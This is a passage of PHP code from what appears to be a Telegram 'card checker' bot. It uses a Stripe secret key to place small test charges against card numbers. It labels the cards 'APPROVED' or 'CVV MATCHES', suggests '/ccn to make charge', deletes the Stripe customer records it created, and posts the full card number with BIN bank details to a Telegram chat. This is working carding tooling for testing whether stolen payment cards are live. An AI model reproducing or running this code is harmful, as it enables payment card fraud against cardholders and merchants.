    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount='.$ammo.'&currency=usd&customer='.$id.'');
    $result = curl_exec($ch);
    if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass"){  
    $skresult = "✅APPROVED!✅";
    $skresponse = "CVV MATCHES! CHARGE 0.01$ SUCCESSFUL!✅";
    $skresponse1 = "The CVC was sent and was correct | Risk score: Normal - 50 ";
    }else{
    $skresult = "❌DECLINED!❌";
    $skresponse = "❌UNCHECKED CARD❌";
    $skresponse1 = "The CVC was sent but wasn’t checked by the issuing bank";
    }}
    elseif(strpos($result, '"cvc_check": "pass"')){
    $skresult = "✅APPROVED!✅";
    $skresponse = "CVV MATCH! AUTH ONLY✅";
    $skresponse1 = "The CVC was sent and was correct but CVC old or changed by card holder";
    }
    elseif(strpos($result, 'security code is incorrect')){
    $skresult = "✅APPROVED!";
    $skresponse = "CCN APPROVED!✅";
    $skresponse1 = "The CVC was sent but was incorrect - try /ccn to make charge";
    }
    elseif (isset($c["error"])){
    $skresult = "❌DECLINED!❌";
    $skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
    $skresponse1 = " your card was declined, please try another card or contract your issuing bank";
    }else{
    $skresult = "❌Error❌";
    $skresponse = "❌Unavailable to check cvc❌";
    $skresponse1 = "The CVC wasn’t sent as it either wasn’t specified by the user, or the transaction is recurring and the CVC was previously deleted";
    };
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
    curl_exec($ch);
    curl_close($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
    curl_exec($ch);
    curl_close($ch);
    
    sendMessage($chatId, '<u>💳 CARD:</u> <code>'.$lista.'</code>%0A<u>💸 AMMOUNT CHARGE:</u> <b>'.$ammo.'%0A<u>🔄 STATUS:</u> <b>'.$skresult.'</b>%0A<u>☑️ RESPONSE:</u> <b>'.$skresponse.'</b>%0A<u>ℹ️ EXTRA INFO:</u> <b>'.$skresponse1.'</b>%0A%0A----- BinData -----%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A--------------------<u>%0A%0A🔭 Checked By:</u> @'.$username.'<u>%0A⏳ Time Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: stowe .</b>', $message_id);
    }
    
////////////////////////////////////////////////////////////////////////////////////////////////


function sendMessage ($chatId, $message, $message_id){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};
function sendimg ($chatId, $message, $message_id){
    $url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
    file_get_contents($url);
    };

?>
